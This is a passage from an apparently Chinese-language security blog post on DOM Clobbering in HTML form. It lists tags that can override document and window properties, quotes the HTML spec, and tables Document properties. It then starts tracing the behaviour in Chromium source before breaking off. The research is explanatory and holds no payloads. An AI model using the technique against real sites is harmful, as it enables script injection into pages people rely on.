class="hljs-string">&quot;details&quot;</span>, <span class="hljs-string">&quot;dfn&quot;</span>, <span class="hljs-string">&quot;dialog&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;div&quot;</span>, <span class="hljs-string">&quot;dl&quot;</span>, <span class="hljs-string">&quot;dt&quot;</span>, <span class="hljs-string">&quot;element&quot;</span>, <span class="hljs-string">&quot;em&quot;</span>, <span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;fieldset&quot;</span>, <span class="hljs-string">&quot;figcaption&quot;</span>, <span class="hljs-string">&quot;figure&quot;</span>, <span class="hljs-string">&quot;font&quot;</span>, <span class="hljs-string">&quot;footer&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;h1&quot;</span>, <span class="hljs-string">&quot;header&quot;</span>, <span class="hljs-string">&quot;hgroup&quot;</span>, <span class="hljs-string">&quot;hr&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;iframe&quot;</span>, <span class="hljs-string">&quot;iframes&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;input&quot;</span>, <span class="hljs-string">&quot;ins&quot;</span>, <span class="hljs-string">&quot;isindex&quot;</span>, <span class="hljs-string">&quot;kbd&quot;</span>, <span class="hljs-string">&quot;keygen&quot;</span>, <span class="hljs-string">&quot;label&quot;</span>, <span class="hljs-string">&quot;legend&quot;</span>, <span class="hljs-string">&quot;li&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;listing&quot;</span>, <span class="hljs-string">&quot;main&quot;</span>, <span class="hljs-string">&quot;map&quot;</span>, <span class="hljs-string">&quot;mark&quot;</span>, <span class="hljs-string">&quot;marquee&quot;</span>, <span class="hljs-string">&quot;menu&quot;</span>, <span class="hljs-string">&quot;menuitem&quot;</span>, <span class="hljs-string">&quot;meta&quot;</span>, <span class="hljs-string">&quot;meter&quot;</span>, <span class="hljs-string">&quot;multicol&quot;</span>, <span class="hljs-string">&quot;nav&quot;</span>, <span class="hljs-string">&quot;nextid&quot;</span>, <span class="hljs-string">&quot;nobr&quot;</span>, <span class="hljs-string">&quot;noembed&quot;</span>, <span class="hljs-string">&quot;noframes&quot;</span>, <span class="hljs-string">&quot;noscript&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>, <span class="hljs-string">&quot;ol&quot;</span>, <span class="hljs-string">&quot;optgroup&quot;</span>, <span class="hljs-string">&quot;option&quot;</span>, <span class="hljs-string">&quot;output&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;picture&quot;</span>, <span class="hljs-string">&quot;plaintext&quot;</span>, <span class="hljs-string">&quot;pre&quot;</span>, <span class="hljs-string">&quot;progress&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>, <span class="hljs-string">&quot;rp&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>, <span class="hljs-string">&quot;rtc&quot;</span>, <span class="hljs-string">&quot;ruby&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;samp&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>,&#xA0;&#x2026;]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Window-amp-Name"><a href="#Window-amp-Name" class="headerlink" title="Window &amp; Name"></a>Window &amp; Name</h3><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">window</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;x&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">window</span>.x != <span class="hljs-literal">undefined</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x4E0E; document &#x4E00;&#x81F4;&#xFF0C;&#x53EA;&#x6709;&#x4E94;&#x4E2A;&#x6807;&#x7B7E;&#x53EF;&#x4EE5;&#x8BA9;<code>window</code>&#x901A;&#x8FC7; name &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#xA0;[<span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x2018;Not-Clobbered&#x2019;"><a href="#&#x2018;Not-Clobbered&#x2019;" class="headerlink" title="&#x2018;Not Clobbered&#x2019;"></a>&#x2018;Not Clobbered&#x2019;</h3><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;body&quot;</span>, <span class="hljs-string">&quot;caption&quot;</span>, <span class="hljs-string">&quot;col&quot;</span>, <span class="hljs-string">&quot;colgroup&quot;</span>, <span class="hljs-string">&quot;frame&quot;</span>, <span class="hljs-string">&quot;frameset&quot;</span>, <span class="hljs-string">&quot;head&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;tbody&quot;</span>, <span class="hljs-string">&quot;td&quot;</span>, <span class="hljs-string">&quot;tfoot&quot;</span>, <span class="hljs-string">&quot;th&quot;</span>, <span class="hljs-string">&quot;thead&quot;</span>, <span class="hljs-string">&quot;tr&quot;</span>]</span><br></pre></td></tr></tbody></table></figure><p></p><p>PS: &#x8FD9;&#x90E8;&#x5206;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x6B63;&#x4E0D;&#x80FD; Clobbered &#xFF0C;&#x56E0;&#x4E3A;&#x6BD4;&#x5982;&#x8BF4;<code>body</code>&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x672C;&#x8EAB;&#x754C;&#x9762;&#x5B58;&#x5728;&#x4E00;&#x4E2A;<code>body</code>&#x6807;&#x7B7E;&#xFF0C;&#x53EA;&#x662F;&#x5728;&#x6211;&#x6D4B;&#x8BD5;&#x6784;&#x5EFA;&#x7684;&#x7B80;&#x5355;&#x7684; HTML &#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x6807;&#x7B7E;&#x4E0D;&#x80FD;&#x88AB; Clobbered &#xFF0C;&#x800C;&#x4E14;&#x5728;&#x5B9E;&#x9645;&#x4E2D;&#x4E5F;&#x7528;&#x5230;&#x6BD4;&#x8F83;&#x5C11;&#x3002;&#x5E76;&#x4E14;&#x6839;&#x636E; Chromium &#x4E2D;&#x7684;&#x8BF4;&#x6CD5;&#x662F;&#x201D;but anything by id&#x201D;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x9700;&#x8981;&#x901A;&#x8FC7;<code>Window.id</code>&#x7684;&#x5F62;&#x5F0F;&#x53BB;&#x83B7;&#x53D6;&#x6807;&#x7B7E;&#x7684;&#x8BDD;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x6807;&#x7B7E;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;&#x6216;&#x8005;&#x4E5F;&#x53EF;&#x4EE5;&#x5C3D;&#x529B;&#x53BB;&#x6784;&#x5EFA;&#x4E0B;&#x6587;&#x7684;&#x8981;&#x6C42;&#x3002;</p><h3 id="Dom-Doc"><a href="#Dom-Doc" class="headerlink" title="Dom Doc"></a>Dom Doc</h3><p>&#x5176;&#x5B9E;&#x5728; Dom &#x6807;&#x51C6;&#x4E2D;&#x4E5F;&#x6709;&#x63D0;&#x53CA;&#x8FC7;&#x8FD9;&#x90E8;&#x5206;&#xFF0C;&#x5728;<a href="https://html.spec.whatwg.org/multipage/dom.html#dom-document-currentscript" target="_blank" rel="noopener">A part of Document interface</a> &#x8FD9;&#x4E00;&#x6BB5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x76F8;&#x5173;&#x89C4;&#x5B9A;&#xFF1A;</p><blockquote><p>&#x200B;    The <code>Document</code> interface <a href="https://heycam.github.io/webidl/#dfn-support-named-properties" target="_blank" rel="noopener">supports named properties</a>. The <a href="https://heycam.github.io/webidl/#dfn-supported-property-names" target="_blank" rel="noopener">supported property names</a> of a <code>Document</code> object document at any moment consist of the following, in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a> according to the element that contributed them, ignoring later duplicates, and with values from <code>id</code> attributes coming before values from <code>name</code> attributes when the same element contributes both:</p><ul><li>the value of the <code>name</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>embed</code>, <code>form</code>, <code>iframe</code>, <code>img</code>, and <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>;</li><li>the value of the <code>id</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/dom.html#exposed" target="_blank" rel="noopener">exposed</a> <code>object</code> elements that have a non-empty <code>id</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>; and</li><li>the value of the <code>id</code> content attribute for all <code>img</code> elements that have both a non-empty <code>id</code> content attribute and a non-empty <code>name</code> content attribute, and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with document as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>.</li></ul></blockquote><p>&#x4E5F;&#x6709;&#x5173;&#x4E8E;<a href="https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object" target="_blank" rel="noopener"> Window &#x5BF9;&#x8C61;&#x7684;&#x90E8;&#x5206;</a>&#xFF1A;</p><blockquote><p>&#x200B;    The <code>Window</code> object <a href="https://heycam.github.io/webidl/#dfn-support-named-properties" target="_blank" rel="noopener">supports named properties</a>. The <a href="https://heycam.github.io/webidl/#dfn-supported-property-names" target="_blank" rel="noopener">supported property names</a> of a <code>Window</code> object window at any moment consist of the following, in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a> according to the element that contributed them, ignoring later duplicates:</p><ul><li>window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#document-tree-child-browsing-context-name-property-set" target="_blank" rel="noopener">document-tree child browsing context name property set</a>;</li><li>the value of the <code>name</code> content attribute for all <code>embed</code>, <code>form</code>, <code>img</code>, and <code>object</code> elements that have a non-empty <code>name</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" target="_blank" rel="noopener">associated <code>Document</code></a> as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>; and</li><li>the value of the <code>id</code> content attribute for all <a href="https://html.spec.whatwg.org/multipage/infrastructure.html#html-elements" target="_blank" rel="noopener">HTML elements</a> that have a non-empty <code>id</code> content attribute and are <a href="https://dom.spec.whatwg.org/#in-a-document-tree" target="_blank" rel="noopener">in a document tree</a> with window&#x2019;s <a href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" target="_blank" rel="noopener">associated <code>Document</code></a> as their <a href="https://dom.spec.whatwg.org/#concept-tree-root" target="_blank" rel="noopener">root</a>.</li></ul></blockquote><h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>&#x5173;&#x4E8E; window &#x5BF9;&#x8C61;&#xFF0C;&#x867D;&#x7136; window &#x5BF9;&#x8C61;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; id &#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x6807;&#x7B7E;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x76EE;&#x524D;&#x8FD8;&#x6CA1;&#x53D1;&#x73B0;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x6807;&#x7B7E; id &#x8FDB;&#x884C; clobber &#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x6BD5;&#x7ADF;&#x662F;&#x57FA;&#x4E8E; Dom &#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;&#x3002;</p><h3 id="Document"><a href="#Document" class="headerlink" title="Document"></a>Document</h3><p>&#x81F3;&#x4E8E; Document &#x5BF9;&#x8C61;&#xFF0C;&#x6211;&#x5217;&#x4E3E;&#x4E86;&#x4E00;&#x4E0B; Document &#x5BF9;&#x8C61;&#x7279;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x4EE5;&#x53CA;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x7C7B;&#x578B;&#xFF1A;</p><table><thead><tr><th>Class</th><th>Attr</th></tr></thead><tbody><tr><td>DOMImplementation</td><td>[&#x201C;implementation&#x201D;]</td></tr><tr><td>HTMLCollection</td><td>[&#x201C;images&#x201D;, &#x201C;embeds&#x201D;, &#x201C;plugins&#x201D;, &#x201C;links&#x201D;, &#x201C;forms&#x201D;, &#x201C;scripts&#x201D;, &#x201C;anchors&#x201D;, &#x201C;applets&#x201D;, &#x201C;children&#x201D;]</td></tr><tr><td>String</td><td>[&#x201C;documentURI&#x201D;, &#x201C;compatMode&#x201D;, &#x201C;characterSet&#x201D;, &#x201C;charset&#x201D;, &#x201C;inputEncoding&#x201D;, &#x201C;contentType&#x201D;, &#x201C;domain&#x201D;, &#x201C;referrer&#x201D;, &#x201C;cookie&#x201D;, &#x201C;lastModified&#x201D;, &#x201C;readyState&#x201D;, &#x201C;title&#x201D;, &#x201C;dir&#x201D;, &#x201C;designMode&#x201D;, &#x201C;fgColor&#x201D;, &#x201C;linkColor&#x201D;, &#x201C;vlinkColor&#x201D;, &#x201C;alinkColor&#x201D;, &#x201C;bgColor&#x201D;, &#x201C;visibilityState&#x201D;, &#x201C;webkitVisibilityState&#x201D;, &#x201C;nodeName&#x201D;, &#x201C;baseURI&#x201D;]</td></tr><tr><td>HTMLBodyElement</td><td>[&#x201C;body&#x201D;, &#x201C;activeElement&#x201D;]</td></tr><tr><td>HTMLHeadElement</td><td>[&#x201C;head&#x201D;]</td></tr><tr><td>HTMLScriptElement</td><td>[&#x201C;currentScript&#x201D;]</td></tr><tr><td>HTMLAllCollection</td><td>[&#x201C;all&#x201D;]</td></tr><tr><td>NodeList</td><td>[&#x201C;childNodes&#x201D;]</td></tr><tr><td>Window</td><td>[&#x201C;defaultView&#x201D;]</td></tr><tr><td>DocumentType</td><td>[&#x201C;doctype&#x201D;, &#x201C;firstChild&#x201D;]</td></tr><tr><td>Boolean</td><td>[&#x201C;xmlStandalone&#x201D;, &#x201C;hidden&#x201D;, &#x201C;wasDiscarded&#x201D;, &#x201C;webkitHidden&#x201D;, &#x201C;fullscreenEnabled&#x201D;, &#x201C;fullscreen&#x201D;, &#x201C;webkitIsFullScreen&#x201D;, &#x201C;webkitFullscreenEnabled&#x201D;, &#x201C;pictureInPictureEnabled&#x201D;, &#x201C;isConnected&#x201D;]</td></tr><tr><td>FontFaceSet</td><td>[&#x201C;fonts&#x201D;]</td></tr><tr><td>StyleSheetList</td><td>[&#x201C;styleSheets&#x201D;]</td></tr><tr><td>Function</td><td>[&#x201C;getElementsByTagName&#x201D;, &#x201C;getElementsByTagNameNS&#x201D;, &#x201C;getElementsByClassName&#x201D;, &#x201C;createDocumentFragment&#x201D;, &#x201C;createTextNode&#x201D;, &#x201C;createCDATASection&#x201D;, &#x201C;createComment&#x201D;, &#x201C;createProcessingInstruction&#x201D;, &#x201C;importNode&#x201D;, &#x201C;adoptNode&#x201D;, &#x201C;createAttribute&#x201D;, &#x201C;createAttributeNS&#x201D;, &#x201C;createEvent&#x201D;, &#x201C;createRange&#x201D;, &#x201C;createNodeIterator&#x201D;, &#x201C;createTreeWalker&#x201D;, &#x201C;getElementsByName&#x201D;, &#x201C;write&#x201D;, &#x201C;writeln&#x201D;, &#x201C;hasFocus&#x201D;, &#x201C;execCommand&#x201D;, &#x201C;queryCommandEnabled&#x201D;, &#x201C;queryCommandIndeterm&#x201D;, &#x201C;queryCommandState&#x201D;, &#x201C;queryCommandSupported&#x201D;, &#x201C;queryCommandValue&#x201D;, &#x201C;clear&#x201D;, &#x201C;exitPointerLock&#x201D;, &#x201C;createElement&#x201D;, &#x201C;createElementNS&#x201D;, &#x201C;caretRangeFromPoint&#x201D;, &#x201C;elementFromPoint&#x201D;, &#x201C;elementsFromPoint&#x201D;, &#x201C;getElementById&#x201D;, &#x201C;prepend&#x201D;, &#x201C;append&#x201D;, &#x201C;querySelector&#x201D;, &#x201C;querySelectorAll&#x201D;, &#x201C;exitFullscreen&#x201D;, &#x201C;webkitCancelFullScreen&#x201D;, &#x201C;webkitExitFullscreen&#x201D;, &#x201C;createExpression&#x201D;, &#x201C;createNSResolver&#x201D;, &#x201C;evaluate&#x201D;, &#x201C;registerElement&#x201D;, &#x201C;exitPictureInPicture&#x201D;, &#x201C;hasChildNodes&#x201D;, &#x201C;getRootNode&#x201D;, &#x201C;normalize&#x201D;, &#x201C;cloneNode&#x201D;, &#x201C;isEqualNode&#x201D;, &#x201C;isSameNode&#x201D;, &#x201C;compareDocumentPosition&#x201D;, &#x201C;contains&#x201D;, &#x201C;lookupPrefix&#x201D;, &#x201C;lookupNamespaceURI&#x201D;, &#x201C;isDefaultNamespace&#x201D;, &#x201C;insertBefore&#x201D;, &#x201C;appendChild&#x201D;, &#x201C;replaceChild&#x201D;, &#x201C;removeChild&#x201D;]</td></tr><tr><td>NodeList</td><td>[&#x201C;childNodes&#x201D;]</td></tr><tr><td>Array</td><td>[&#x201C;adoptedStyleSheets&#x201D;]</td></tr><tr><td>FeaturePolicy</td><td>[&#x201C;featurePolicy&#x201D;]</td></tr><tr><td>Null</td><td>[&#x201C;xmlEncoding&#x201D;, &#x201C;xmlVersion&#x201D;, &#x201C;onreadystatechange&#x201D;, &#x201C;onpointerlockchange&#x201D;, &#x201C;onpointerlockerror&#x201D;, &#x201C;onbeforecopy&#x201D;, &#x201C;onbeforecut&#x201D;, &#x201C;onbeforepaste&#x201D;, &#x201C;onfreeze&#x201D;, &#x201C;onresume&#x201D;, &#x201C;onsecuritypolicyviolation&#x201D;, &#x201C;onvisibilitychange&#x201D;, &#x201C;oncopy&#x201D;, &#x201C;oncut&#x201D;, &#x201C;onpaste&#x201D;, &#x201C;pointerLockElement&#x201D;, &#x201C;fullscreenElement&#x201D;, &#x201C;onfullscreenchange&#x201D;, &#x201C;onfullscreenerror&#x201D;, &#x201C;webkitCurrentFullScreenElement&#x201D;, &#x201C;webkitFullscreenElement&#x201D;, &#x201C;onwebkitfullscreenchange&#x201D;, &#x201C;onwebkitfullscreenerror&#x201D;, &#x201C;rootElement&#x201D;, &#x201C;pictureInPictureElement&#x201D;, &#x201C;ownerDocument&#x201D;, &#x201C;parentNode&#x201D;, &#x201C;parentElement&#x201D;, &#x201C;previousSibling&#x201D;, &#x201C;nextSibling&#x201D;, &#x201C;nodeValue&#x201D;, &#x201C;textContent&#x201D;]</td></tr></tbody></table><p>&#x5176;&#x4E2D;&#xFF0C;<code>HTMLBodyElement</code>/<code>HTMLHeadElement</code>/<code>HTMLScriptElement</code> &#x5747;&#x7EE7;&#x627F;&#x81EA;<code>HTMLElement</code>&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x8FD9;&#x4E9B;&#x5462;&#xFF1F;&#x56E0;&#x4E3A;&#x5728;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x6211;&#x4EEC; Clobber &#x5F97;&#x5230;&#x7684;&#x5C31;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElement</code>&#xFF0C;&#x800C; Document &#x67D0;&#x4E9B;&#x5C5E;&#x6027;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;<code>HTMLElement</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x3002;</p><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>&#x6211;&#x60F3;&#x5982;&#x679C;&#x80FD;&#x8986;&#x76D6;&#x7684;&#x8BDD;&#xFF0C;&#x5E94;&#x8BE5;&#x5C31;&#x662F;&#x5728;&#x8C03;&#x7528;<code>document.x</code>&#x7684;&#x65F6;&#x5019;&#xFF0C; Dom &#x6811;&#x89E3;&#x6790;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x8981;&#x4F18;&#x5148;&#x4E8E;<code>document</code>&#x81EA;&#x5DF1;&#x672C;&#x8EAB;&#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x4EA7;&#x751F;&#x4E86;&#x8FD9;&#x6837;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x4E5F;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x4EEC;&#x5728;&#x8986;&#x76D6;<code>cookie</code>&#x7684;&#x65F6;&#x5019;&#x5374;&#x4E0D;&#x80FD;&#x5B8C;&#x5168;&#x63A7;&#x5236;&#x8986;&#x76D6;&#x5462;&#xFF1F;</p><p>&#x5E26;&#x7740;&#x8FD9;&#x4E9B;&#x7591;&#x95EE;&#xFF0C;&#x6211;&#x7279;&#x5730;&#x53BB;&#x770B;&#x4E86;&#x4E00;&#x4F1A; chromium &#x7684;&#x6E90;&#x7801;&#xFF0C;&#x7B80;&#x7565;&#x5730;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x8FD9;&#x4E9B;&#x5B9E;&#x73B0;&#xFF0C;&#x4E3B;&#x8981;&#x5728; chromium &#x7684; blink &#x90E8;&#x5206;&#x3002;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x77E5;&#x8BC6;&#x6D45;&#x8584;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x5730;&#x9605;&#x8BFB;&#x8FC7; chromium &#x6E90;&#x7801;&#xFF0C;&#x8FD9;&#x91CC;&#x8FD8;&#x53EF;&#x80FD;&#x8BBE;&#x8BA1;&#x5230;&#x4E00;&#x4E9B;&#x7F16;&#x8BD1;&#x539F;&#x7406;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x5B89;&#x5168;&#x628A;&#x6574;&#x4E2A; Chromium &#x4EA7;&#x751F;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x7F18;&#x7531;&#x4EE5;&#x4EE3;&#x7801;&#x8FFD;&#x8E2A;&#x7684;&#x5F62;&#x5F0F;&#x5F04;&#x51FA;&#x6765;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x5F04;&#x7684;&#x8BDD;&#x4F30;&#x8BA1;&#x4E5F;&#x5F97;&#x53BB; debug Chromium &#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E2A;&#x90E8;&#x5206;&#x8FD8;&#x6709;&#x5F85;&#x7EE7;&#x7EED;&#x7814;&#x7A76;&#xFF0C;&#x4E0D;&#x8FC7;&#x6211;&#x628A;&#x81EA;&#x5DF1;&#x770B;&#x7684;&#x4E00;&#x4E9B;&#x6709;&#x7528;&#x7684;&#x90E8;&#x5206;&#x5199;&#x51FA;&#x6765;&#x3002;&#x5982;&#x679C;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x670B;&#x53CB;&#x53EF;&#x4EE5;&#x8054;&#x7CFB;&#x6211;&#x4E00;&#x8D77;&#x7814;&#x7A76;&#x770B;&#x770B;&#x3002;&#xFF08;&#x867D;&#x7136;&#x6211;&#x5F88;&#x83DC;XD</p><p>&#x5168;&#x90E8;&#x4EE3;&#x7801;&#x6765;&#x6E90;&#x4E8E; <a href="https://source.chromium.org/" target="_blank" rel="noopener">Chomiunm Code Search</a>&#xFF0C;&#x8FD9;&#x4E2A;&#x5E73;&#x53F0;&#x53EF;&#x4EE5;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#x5BA1;&#x4EE3;&#x7801;&#x3002;</p><h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;<code>location</code>&#xFF0C;&#x6211;&#x4EEC;&#x65E2;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>window.location</code>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>document.location</code>&#x62FF;&#x5230;<code>location</code>&#xFF0C;&#x8FD9;&#x4E5F;&#x80FD;&#x8BF4;&#x660E;&#x6211;&#x4EEC;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0A;&#x6587;&#x8981;&#x5355;&#x72EC; fuzz Document &#x7279;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x800C;&#x4E0D;&#x662F;&#x5168;&#x90E8;&#x5C5E;&#x6027;&#x4E86;&#x3002;</p><p>&#x5728; Chromium &#x6E90;&#x7801;&#x4E2D;&#xFF0C;&#x627E;&#x5230;<code>location</code>&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C; Chromium &#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;<code>window</code>&#x5BF9;&#x8C61;&#x7684;<code>location()</code>&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x8986;&#x76D6;&#x4E0D;&#x4E86;&#x3002;</p><p>&#x5728;<code>third_party/blink/renderer/core/dom/document.cc</code>&#x4E2D;&#xFF0C;&#x7B2C; 933 &#x884C;&#x4E2D;&#x6709;&#x76F8;&#x5173;&#x5B9A;&#x4E49; <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/dom/document.cc;l=933?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">Document::location()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">Location* <span class="hljs-title">Document::location</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (!GetFrame())</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> domWindow()-&gt;location();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;<code>domWindow()</code>&#x6765;&#x83B7;&#x53D6;<code>location</code>&#xFF0C;&#x5728;<code>third_party/blink/renderer/core/frame/dom_window.cc</code>&#x4E2D;&#xFF0C;&#x7B2C;85&#x884C;&#x6709;&#x76F8;&#x5173;&#x5B9A;&#x4E49; <a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/frame/dom_window.cc;drc=7e3843b722bda29c236e9cb49111f3296dc2ce20;l=85" target="_blank" rel="noopener">DOMWindow::location()</a></p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">Location* <span class="hljs-title">DOMWindow::location</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (!location_)</span><br><span class="line">    location_ = MakeGarbageCollected&lt;Location&gt;(<span class="hljs-keyword">const_cast</span>&lt;DOMWindow*&gt;(<span class="hljs-keyword">this</span>));</span><br><span class="line">  <span class="hljs-keyword">return</span> location_.Get();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53E6;&#x5916;&#xFF0C;&#x6709;&#x4EBA;&#x63D0;&#x8FC7;&#x76F8;&#x5173;&#x7528;&#x5176;&#x4ED6; hook &#x7684;&#x65B9;&#x5F0F; <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=315760" target="_blank" rel="noopener">Issue 315760: document.domain can be hooked</a>&#xFF0C;&#x91CC;&#x9762;&#x63D0;&#x5230;&#x53EF;&#x4EE5; hook &#x5230; domain &#x8DDF; location &#xFF0C;&#x4F46;&#x662F;&#x6211;&#x5728;&#x76EE;&#x524D; stable chrome 